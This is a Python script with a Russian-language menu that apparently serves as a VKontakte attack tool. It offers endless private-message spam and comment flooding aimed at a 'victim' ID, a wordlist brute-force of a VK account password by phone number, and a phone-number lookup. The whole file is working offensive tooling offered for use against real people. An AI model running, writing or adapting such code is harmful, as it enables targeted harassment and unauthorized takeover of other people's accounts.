
import os, vk_api, random

def choice1():
	import time

	token = input("Токен VK Admin:|/> ")
	user_id = input("Айди жертвы:|/> ")
	message = input("Сообщение:|/> ")
	delay = int(input("Задержка(Сек):|/> "))
	sessions = vk_api.VkApi(token = token)
	vksession = sessions.get_api()
	count = int(0)
	fail = int(0)
	while True:
		try:
			count = count + 1
			print("Отправлено" + "("+str(count)+")" + "|",
			 vksession.messages.send(user_id = user_id, message = message, random_id = random.randint(0, 9999999999)))
			time.sleep(delay)
		except:
			fail = fail + 1
			print("Неудачно" + "("+str(fail)+")")
			pass
		time.sleep(delay)
#######################################################
def choice2():
	import time

	token = input("Токен VK Admin:|/> ")
	owner_id = input("Айди жертвы:|/> ")
	post_id = input("Айди поста(последние цифры в ссылке):|/> ")
	message = input("Сообщение:|/> ")
	delay = int(input("Задержка(Сек):|/> "))
	sessions = vk_api.VkApi(token = token)
	vksession = sessions.get_api()
	count = int(0)
	fail = int(0)
	while True:
		try:
			count = count + 1
			print("Отправлено" + "("+str(count)+")" + "|",
			 vksession.wall.createComment(owner_id = owner_id, post_id = post_id, message = message,
			  random_id = random.randint(0, 9999999999)))
			time.sleep(delay)
		except:
			fail = fail + 1
			print("Неудачно" + "("+str(fail)+")")
			pass
		time.sleep(delay)
#######################################################
def choice3():
	import time

	phone = input("Телефон:|/> ")
	delay = int(input("Задежка:|/> "))
	file = "base.txt"
	with open(file) as f:
		lines = f.readlines()
	lines = [line.strip('\n') for line in open(file)]
	for password in lines:
		try:
			vk_session = vk_api.VkApi(phone, str(password))
			vk_session.auth()
			print(phone, ":Пароль найден: " + str(password))
			time.sleep(20)
		except Exception as e:
			if e.code == 14:
				print("ВКонтакте запросил капчу[(14)].")
			elif e.code == 5:
				print("Авторизация пользователя не удалась[(5)].")
			else:
				print("Код ошибки:", e.code)
				time.sleep(10)
		time.sleep(delay)
#######################################################
def choice4():
	import requests

	try:
		phone = input("| Телефон:|/> ")
		scan_info = requests.get("https://htmlweb.ru/geo/api.php?json&telcod=" + phone)
		data = scan_info.json()
		country = str(data["country"]["fullname"])
		idd = str(data["country"]["id"])
		code_country = str(data["country"]["telcod"])
		lengh_code = str(data["country"]["telcod_len"])
		location_country = str(data["country"]["location"])
		operator = str(data["0"]["oper"])
		print("| Страна: " + str(country) + "(" + str(idd) + ") |")
		print("| Контитент: " + str(location_country) + " |")
		print("| Код страны: +" + str(code_country) + "(длина номера в стране " + str(lengh_code) +") |")
		print("| Оператор: " + str(operator) + " |")
		input()
	except Exception as e:
		print("Исчерпан лимит запросов в день на один IP")
		input()
		print(e.code)
def choice5():
	os.system("cls")
#######################################################
def main():
	os.system("cls")
	banner = """
 ____________________________________________________________________________
|[1] - Спам в личные сообщения [2] - Спам комментариями                      |
|[3] - Подбор пароля(бета)     [4] - Информация о телефоне                   |
|[5] - Очистить                                                              |
|____________________________________________________________________________|
"""
	choice = input(banner + "\n/> ")

	if choice == "1":
		choice1()
		pass
	elif choice == "2":
		choice2()
		pass
	elif choice == "3":
		choice3()
		pass
	elif choice == "4":
		choice4()
		pass
	elif choice == "5":
		choice5()
		main()
		pass
	else:
		print("[-]> Неверное число")
		pass

main()